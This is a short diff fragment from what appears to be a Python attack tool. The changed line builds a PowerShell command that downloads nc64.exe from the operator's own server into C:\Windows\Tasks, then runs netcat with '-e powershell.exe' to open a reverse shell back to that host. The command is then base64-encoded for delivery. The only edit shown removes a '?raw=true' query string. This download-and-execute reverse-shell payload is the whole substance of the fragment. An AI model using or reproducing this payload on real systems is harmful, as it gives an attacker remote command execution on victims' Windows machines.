@@ -117,7 +117,7 @@ def main(args):
 
     command = args.command
     if args.reverseport:
-        command = f"""Invoke-WebRequest http://{serve_host}:{args.port}/tools/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e powershell.exe {serve_host} {args.reverseport}"""
+        command = f"""Invoke-WebRequest http://{serve_host}:{args.port}/tools/nc64.exe -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e powershell.exe {serve_host} {args.reverseport}"""
 
     # Base64 encode our command so whitespace is respected
     base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")
